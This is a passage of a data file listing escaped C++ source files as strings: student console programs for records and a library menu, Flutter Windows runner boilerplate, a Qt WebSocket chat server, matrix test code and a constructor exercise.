update\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"\\nPrevious data\"<<endl<<endl;\ncout<<\"Data of Student \"<<i+1<<endl;\ncout<<\"Roll NO: \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"Course \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\ncout<<\"\\nEnter new data\"<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter CouRse: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\n}\n}\n}\nvoid Delete()\n{\nif(total==0)\n{\ncout<<\"No data is Entered yet\"<<endl;\n}\nelse\n{\nint a;\ncout<<\"Are you Sure to Delete Data?\"<<endl;\ncout<<\"Press 1 to delete all Record\"<<endl;\ncin>>a;\nif(a==1)\n{\ntotal=0;\ncout<<\"All Record is deleted..!!\"<<endl;\n}\nelse\n{\ncout<<\"Please Press 1 to Delete All Record\"<<endl;\n}\n}\n}\nint main() \n{\nint value;\nwhile(true)\n{\ncout<<\"\\nPress 1 to Enter data\"<<endl<<endl;\ncout<<\"PRess 2 to Show data\"<<endl<<endl;\ncout<<\"PRess 3 to Search data\"<<endl<<endl;\ncout<<\"Press 4 to Update data\"<<endl<<endl;\ncout<<\"Press 5 to Delete data\"<<endl<<endl;\ncout<<\"Press 6 to Quit\"<<endl<<endl;\ncin>>value;\nswitch(value)\n{\ncase 1:\nEnter();\nbreak;\ncase 2:\nshow();\nbreak;\ncase 3:\nsearch();\nbreak;\ncase 4:\nupdate();\nbreak;\ncase 5:\nDelete();\nbreak;\ncase 6:\nexit(0);\nbreak;\ndefault:\ncout<<\"Invalid input\"<<endl;\nbreak;\n}\n}\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bloc_chat_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"server.h\"\r\n#include <QDebug>\r\n#include <QTextStream>\r\n#include <QHostInfo>\r\nQTextStream cin(stdin);\r\n\r\nServer::Server(QObject *parent) \r\n    : QWebSocketServer{\"EchoServer\",QWebSocketServer::NonSecureMode,parent}\r\n{\r\n    if(this->listen(QHostAddress::AnyIPv4,5555)){ //\u00f4\u00ee\u00f0\u00ec\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0 \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00e2 \u00e8 \u00e8\u00f5 \u00e2\u00fb\u00e2\u00ee\u00e4 \u00e2\u00ec\u00e5\u00f1\u00f2\u00e5 \u00f1 \u00ef\u00ee\u00f0\u00f2\u00ee\u00ec \u00e4\u00eb\u00ff \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00ff\r\n        QString ipAddress =\"\";\r\n        QHostInfo info = QHostInfo::fromName(QHostInfo::localHostName());\r\n        QList<QHostAddress> listAddr= info.addresses();\r\n        for( int i = 0; i < listAddr.size(); i ++ ){\r\n            if( listAddr.at(i).protocol() == QAbstractSocket::IPv4Protocol ){\r\n                ipAddress += \" | \";\r\n                ipAddress += listAddr.at(i).toString();\r\n            }\r\n        }\r\n        qDebug() << \"Server started successfully\"\r\n                 << \"for stop please enter \\\"stop\\\" \\n\"\r\n                 << \"Allowed addresses:\" << ipAddress\r\n                 << \"\\n Allowed ports: \" << this->serverPort();\r\n    }\r\n    else {\r\n        qDebug() << this->errorString();\r\n    }\r\n    connect(this,&Server::newConnection,this, &Server::clientConnected); //\u00ef\u00ee\u00e7\u00e2\u00ee\u00eb\u00ff\u00e5\u00f2 \u00ee\u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00ff\u00f2\u00fc \u00e8 \u00ee\u00e1\u00f0\u00e0\u00e1\u00e0\u00f2\u00fb\u00e2\u00e0\u00f2\u00fc \u00e2\u00f5\u00ee\u00e4\u00ff\u00f9\u00e8\u00e5 \u00f1\u00ee\u00e5\u00e4\u00e8\u00ed\u00e5\u00ed\u00e8\u00ff\r\n    m_thread=new std::thread(std::bind(&Server::stopWaitingLoop,this));\r\n}\r\n\r\nServer::~Server() { //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00ee\u00f7\u00e8\u00f1\u00f2\u00ea\u00e0 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8, \u00e2\u00fb\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e9 \u00ed\u00e0 \u00ea\u00f3\u00f7\u00e5 \u00e4\u00eb\u00ff \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00e8\u00f5 \u00f1\u00ee\u00ea\u00e5\u00f2\u00ee\u00e2 \u00e8 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ef\u00ee\u00f2\u00ee\u00ea\u00e0\r\n    if(m_thread){\r\n        delete m_thread;\r\n    }\r\n    for(auto &clientSock:clientsSocks){\r\n        if(clientSock!=nullptr){\r\n            clientSock->deleteLater();\r\n        }\r\n    }\r\n    clientsSocks.clear();\r\n}\r\n\r\nvoid Server::stopWaitingLoop() //\u00e1\u00e5\u00f1\u00ea\u00ee\u00ed\u00e5\u00f7\u00ed\u00fb\u00e9 \u00f6\u00e8\u00ea\u00eb \u00ee\u00e6\u00e8\u00e4\u00e0\u00fe\u00f9\u00e8\u00e9 \u00e2\u00e2\u00ee\u00e4\u00e0 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e5\u00e9 \u00ea\u00ee\u00ec\u00e0\u00ed\u00e4\u00fb \u00e4\u00eb\u00ff \u00ee\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00ea\u00e8 \u00f1\u00e5\u00f0\u00e2\u00e5\u00f0\u00e0\r\n{\r\n    QString input;\r\n    while(true){\r\n        cin.readLineInto(&input,0);\r\n        if(!input.isEmpty()){\r\n            if(input==\"stop\" or input == \"STOP\" or input == \"Stop\"){\r\n                break;\r\n            }\r\n        }\r\n    }\r\n    this->deleteLater();\r\n    this->close();\r\n}\r\n\r\nvoid Server::clientConnected(){ //\u00ee\u00e1\u00e5\u00f1\u00ef\u00e5\u00f7\u00e8\u00e2\u00e0\u00e5\u00f2 \u00ee\u00ef\u00ee\u00e2\u00e5\u00f9\u00e5\u00ed\u00e8\u00e5 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00e0 \u00ee \u00e5\u00e3\u00ee \u00f3\u00f1\u00ef\u00e5\u00f8\u00ed\u00ee\u00ec \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00e8\r\n\r\n    QWebSocket *clientSock;\r\n    clientSock = this->nextPendingConnection();\r\n    clientSock->sendBinaryMessage(QByteArray::fromStdString(std::string(\"connected\")));\r\n\r\n    //\u00f1\u00e2\u00ff\u00e7\u00fb\u00e2\u00e0\u00e5\u00f2 \u00f1\u00e8\u00e3\u00ed\u00e0\u00eb\u00fb \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00ee\u00e3\u00ee \u00f1\u00ee\u00ea\u00e5\u00f2\u00e0 \u00f1 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e8\u00ec\u00e8 \u00f1\u00eb\u00ee\u00f2\u00e0\u00ec\u00e8:\r\n    connect(clientSock,&QWebSocket::textMessageReceived,this,&Server::messageReceived);\r\n    connect(clientSock,&QWebSocket::disconnected,this,&Server::clientDisconnected);\r\n    connect(clientSock,&QWebSocket::disconnected,clientSock,&QWebSocket::deleteLater);\r\n\r\n    //\u00e7\u00e0\u00ed\u00ee\u00f1\u00e8\u00f2 \u00f3\u00ea\u00e0\u00e7\u00e0\u00f2\u00e5\u00eb\u00fc \u00ed\u00e0 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00e8\u00e9 \u00f1\u00ee\u00ea\u00e5\u00f2 \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea\r\n    clientsSocks.push_back(clientSock);\r\n    qDebug() << \"Client with address:\" << clientSock->peerAddress().toString()\r\n             << \"has been connected\";\r\n}\r\n\r\nvoid Server::messageReceived(const QString &msg){ //\u00c2\u00fb\u00e2\u00ee\u00e4\u00e8\u00f2 \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc \u00e0\u00e4\u00f0\u00e5\u00f1 \u00e8 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00e5 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00e0, \u00e7\u00e0\u00f2\u00e5\u00ec \u00f0\u00e0\u00f1\u00f1\u00fb\u00eb\u00e0\u00e5\u00f2 \u00fd\u00f2\u00f3 \u00ef\u00e0\u00f0\u00f3 \u00e2\u00f1\u00e5\u00ec \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00ed\u00fb\u00ec \u00ef\u00ee\u00eb\u00fc\u00e7\u00ee\u00e2\u00e0\u00f2\u00e5\u00eb\u00ff\u00ec\r\n    QWebSocket *clientSenderSock=(QWebSocket*)sender();\r\n    qDebug() << \"Message from: \"<< clientSenderSock->peerAddress().toString() << \" is: \" << msg;\r\n    for(auto &clientSock: clientsSocks){\r\n        if(clientSock->peerAddress()!=clientSenderSock->peerAddress()){\r\n            clientSock->sendTextMessage(clientSenderSock->peerAddress().toString()+QString(\":\")+msg);\r\n        }\r\n    }\r\n}\r\n\r\nvoid Server::clientDisconnected() //\u00ee\u00f2\u00e2\u00e5\u00f7\u00e0\u00e5\u00f2 \u00e7\u00e0 \u00e2\u00fb\u00e2\u00ee\u00e4 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00ff \u00ee\u00e1 \u00ee\u00f2\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00e8 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00e0 \u00e8 \u00ee\u00f7\u00e8\u00f1\u00f2\u00ea\u00f3 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8, \u00e2\u00fb\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e9 \u00e4\u00eb\u00ff \u00e5\u00e3\u00ee \u00f1\u00ee\u00ea\u00e5\u00f2\u00e0\r\n{\r\n    QWebSocket *p_disconnectedClientSock= qobject_cast<QWebSocket *>(sender());\r\n    qDebug() << \"Client with address:\" << p_disconnectedClientSock->peerAddress().toString()\r\n             << \"has been disconnected\";\r\n    auto disconnectedClientPos=std::find(clientsSocks.begin(),clientsSocks.end(),p_disconnectedClientSock);\r\n    clientsSocks.at(std::distance(clientsSocks.begin(),disconnectedClientPos))->deleteLater();\r\n    clientsSocks.erase(disconnectedClientPos);\r\n}\r\n\r\n\r\n",
    "#include <iostream>\n#include \"Matrix.cpp\"\n#include \"Activation.cpp\"\n#include \"Dense.cpp\"\n#include \"MlpNetwork.cpp\"\n#include <fstream>\n\n#include \"Matrix.h\"\n#include \"Activation.h\"\n#include \"Dense.h\"\n#include \"MlpNetwork.h\"\n// read a file into memory\n#include <fstream>\n\nint main ()\n{\n  // test constructor\n//  for(int i = 0;i<=3;i++){\n//    for(int j=0;j<=3;j++){\n//      Matrix a =Matrix(i,j);\n//      printf(\"this is matrix (%d,%d)\\n\",i,j);\n//      a.plain_print();\n//    }\n//  }\n\n//  //copy ctor\n  Matrix a = Matrix(2,3);\n  a(1,1) = 2;\n  Matrix b = Matrix(a);\n  a(1,1)=3;\n  b.plain_print();\n  printf(\"\\n\");\n  a.plain_print();\n\n//  // getterss\n  const Matrix a_c = Matrix(2,3);\n  printf(\"%d\",a.get_cols());\n  printf(\"%d\",a_c.get_cols());\n  printf(\"%d\",a.get_rows());\n  printf(\"%d\",a_c.get_rows());\n\n//  //trasnsposr\n//  Matrix a =Matrix(2,2);\n//  a(0,1)=2;\n//  a.plain_print();\n//  a.transpose();\n//  a.plain_print();\n//\n//  Matrix a =Matrix(3,2);\n//  a(2,1)=2;\n//  a.plain_print();\n//  a.transpose();\n//  a.plain_print();\n//  a.transpose();\n//  a.plain_print();\n//\n//  Matrix a = Matrix(2,2);\n//  a(0,0)=1;\n//  a(0,1)=2;\n//  a(1,0)=3;\n//  a(1,1)=4;\n//  a.plain_print();\n//  a.vectorize();\n//  a.plain_print();\n//\n//  Matrix a = Matrix(3,2);\n//  a(0,0)=1;\n//  a(0,1)=2;\n//  a(1,0)=3;\n//  a(1,1)=4;\n//  a(2,0)=5;\n//  a.plain_print();\n//  a.vectorize();\n//  a.plain_print();\n//\n//  Matrix a = Matrix(3,2);\n//  a(0,0)=1;\n//  a(0,1)=2;\n//  a(1,0)=3;\n//  a(1,1)=4;\n//  a(2,0)=5;\n//  Matrix b = Matrix(3,2);\n//  b(0,0)=0;\n//  b(0,1)=2;\n//  b(1,0)=3;\n//  b(1,1)=2;\n//  b(2,0)=2;\n//  a.plain_print();\n//  printf(\"\\n_______\\n\");\n//  b.plain_print();\n//  printf(\"\\n_______\\n\");\n//  Matrix z = a.dot (b);\n//  z.plain_print();\n//  printf(\"sum =31 got  %f \\n\",z.sum());\n//  printf(\"norm =16.155 got  %f \\n\",z.norm());\n//  printf(\"argmax index = 4 got  %d \\n\",z.argmax());\n//  z.vectorize().plain_print();\n//\n//\n////addition etc\n//  Matrix a = Matrix(3,2);\n//  a(0,0)=1;\n//  a(0,1)=2;\n//  a(1,0)=3;\n//  a(1,1)=4;\n//  a(2,0)=5;\n//  Matrix b = Matrix(3,2);\n//  b(0,0)=0;\n//  b(0,1)=2;\n//  b(1,0)=3;\n//  b(1,1)=2;\n//  b(2,0)=2;\n//  a.plain_print();\n//  printf(\"\\n\");\n//  b.plain_print();\n//  printf(\"\\n\");\n//  (a+b).plain_print();\n//  a+=b;\n//  printf(\"\\n\");\n//  a.plain_print();\n//  a=b;\n//  printf(\"\\n\");\n//  a.plain_print();\n//  printf(\"\\n\");\n//  b(0,0)=1;\n//  b.transpose();\n//  b.plain_print();\n//  printf(\"\\n\");\n//\n//  (a*b).plain_print();\n//  printf(\"\\n\");\n//\n//  (b*a).plain_print();\n//  printf(\"\\n\");\n//  Matrix c = Matrix(3,2);\n//  c(0,0)=1;\n//  c(0,1)=1;\n//  c(1,0)=1;\n//  c(1,1)=1;\n//  c(2,0)=1;\n//  printf(\"\\n\");\n//\n//  c.plain_print();\n//  printf(\"\\n\");\n//\n//  c = 3*c;\n//  c.plain_print();\n//\n//  Matrix a = Matrix(3,2);\n//  a(0,0)=1;\n//  a(0,1)=2;\n//  a(1,0)=3;\n//  a(1,1)=4;\n//  a(2,0)=5;\n//  a.plain_print();\n//  for(int i=0;i<a.get_rows()*a.get_cols();i++){\n//    printf(\"%d %f\\n\",i,a[i]);\n//  }\n//  a.vectorize().plain_print();\n//\n//\n//  std::ifstream is(\"im0\", std::ios::in | std::ios::binary);\n//  Matrix a = Matrix(28,28);\n//  is>>a;\n//  std::cout<<a;\n//  return 0;\n//}\n",
    "//8.Write a program to implement constructors\r\n//a.default Constructor ,Parameterized Constructor,Copy Constructor\r\n//b.Define the Constructor inside/utside of the class\r\n//c.Implement all three constructors within a single class as well as use multiple classes(individual classes)\r\n#include<iostream>\r\nusing namespace std;\r\nclass Cons{\r\n\tprivate:\r\n\t\tint a,b,c;\r\n\tpublic:\r\n\t\tCons(){\r\n\t\t\tcout<<\"default Constructor\"<<endl;\r\n\t\t\ta=0;\r\n\t\t\tb=0;\r\n\t\t\tc=0;\r\n\t\t}\r\n\t\tCons(int x,int y,int z){\r\n\t\t\tcout<<\"parameterized constructor\"<<endl;\r\n\t\t\ta=x;\r\n\t\t\tb=y;\r\n\t\t\tc=z;\r\n\t\t}\r\n\t\tCons(Cons &p){\r\n\t\t\tcout<<\"copy constructor \"<<endl;\r\n\t\t\ta=p.a;\r\n\t\t\tb=p.b;\r\n\t\t\tc=p.c;\r\n\t\t}\r\n\t\t\tvoid display();\r\n\t\t};\t\r\n\t\r\n\t\tvoid Cons::display()\r\n\t\t{\r\n\t\t\tcout<<\"a=\"<<a<<\"b=\"<<b<<\"c=\"<<c<<endl;\r\n\t\t}\r\n\r\nint main(){\r\n\tCons obj1;\r\n\tcout<<\"obj1 data values\"<<endl;\r\n\tobj1.display();\r\n\r\n    Cons obj2(10,20,30);\r\n\tcout<<\"obj2 data values\"<<endl;\r\n\tobj2.display();\r\n\t\r\n\tCons obj3(obj2);\r\n\tcout<<\"obj3 data values\"<<endl;\r\n\tobj3.display();\r\n\r\n  return 0;\r\n}\r\n\r\n\r\n",
    "#include \"Book.h\"\nint main()\n{\n\tint NBooks=NULL;\n    FILE* fp = nullptr;\n    Book* books=new Book[1];\n    \n    fopen_s(&fp, \"books.txt\", \"r\"); //\u00e7\u00e0\u00ef\u00ee\u00e2\u00ed\u00e5\u00ed\u00ed\u00ff \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 \n    if (fp != NULL) \n    {    \n        fread(&NBooks, sizeof(int), 1, fp);\n        delete[] books;\n        books = new Book[NBooks];\n        for(int i =0 ;i<NBooks;i++)\n        {\n            books[i].loadFromBinFile(fp);\n        }\n        fclose(fp);\n    }\n\n\n\tint menu,deleteId,menuSort,menuEdit,editId,menuFind;\n    Book tmp;\n\tdo \n\t{\n        cout << \"--------------------------------\\n\";\n        cout << \"|             MENU             |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|1.Show all books in library   |\\n\";\n        cout << \"|2.Add new book                |\\n\";\n        cout << \"|3.Remove book                 |\\n\";\n        cout << \"|4.Show sorted books           |\\n\";\n        cout << \"|5.Edit info in book           |\\n\";\n        cout << \"|6.Search book                 |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|0.Exit                        |\\n\";\n        cout << \"--------------------------------\\n\";\n        cout << \" >>> \"; cin >> menu;\n\t\n        switch (menu)\n        {\n        \n        case 1:\n            cout << \"\\n\\n\\n\";\n            for(int i = 0;i<NBooks;i++)\n            {\n                books[i].showBook();\n            }\n            cout << \"\\n\\n\\n\";\n            break;\n        \n        case 2:\n            tmp.addNewBook();\n            if (NBooks==NULL) \n            {\n                cout << \"asd\";\n                books[0] = tmp;\n                NBooks=1;\n            }\n            else\n            {\n                addItemBack(books, NBooks, tmp);\n            }\n            break;\n        \n        case 3:\n            char deleteName[50];\n            cout << \"\\n\\nEnter book name to delete - \";\n            cin.ignore();\n            cin.getline(deleteName,50);\n            cout << endl;\n            deleteId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, deleteName) == 0) \n                {\n                    deleteId = i;\n                    break;\n                }\n            }\n            if(deleteId!=-1)\n            {\n            removeItem(books, NBooks, deleteId);\n            cout << \"Deleted!\\n\" << endl;\n            }\n            else \n            {\n                cout << \"Not found book with that name!\\n\"<<endl;\n            }\n            break;\n\n        case 4:\n            do {\n                cout << \"\\n\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|                           SORT                     |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|1.Sort by pages (from max to min)                   |\\n\";\n                cout << \"|2.Sort by develope year (from older to newest)      |\\n\";\n                cout << \"|3.Sort by add to library year (from older to newest)|\\n\";\n                cout << \"|----------------------------------------------------|\\n\";\n                cout << \"|0.Back to main menu                                 |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \" >>> \"; cin >> menuSort;\n                cout << \"\\n\\n\";\n                \n                switch (menuSort) \n                {\n                case 1:\n                    showSortedPages(books, NBooks);\n                    break;\n                case 2:\n                    showSortedDateWriten(books, NBooks);\n                    break;\n                case 3:\n                    showSortedDateAdded(books, NBooks);\n                    break;\n                case 0:\n                    break;\n                default:\n                    cout << \"Error command!\"<<endl;\n                    break;\n                }\n            } while (menuSort != 0);\n                break;\n        case 5:\n            char editingBook[50];\n            cout << \"\\nEnter name of book for edit - \";\n            cin.ignore();\n            cin.getline(editingBook, 50);\n            cout << endl;\n            editId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, editingBook) == 0)\n                {\n                    editId = i;\n                    break;\n                }\n            }\n            if(editId!=-1)\n            {\n                do {\n\n                    cout << \"\\n\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|                          EDIT                 |\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|1. Edit type of book                           |\\n\";\n                    cout << \"|2. Edit name of book                           |\\n\";\n                    ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weatherapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the 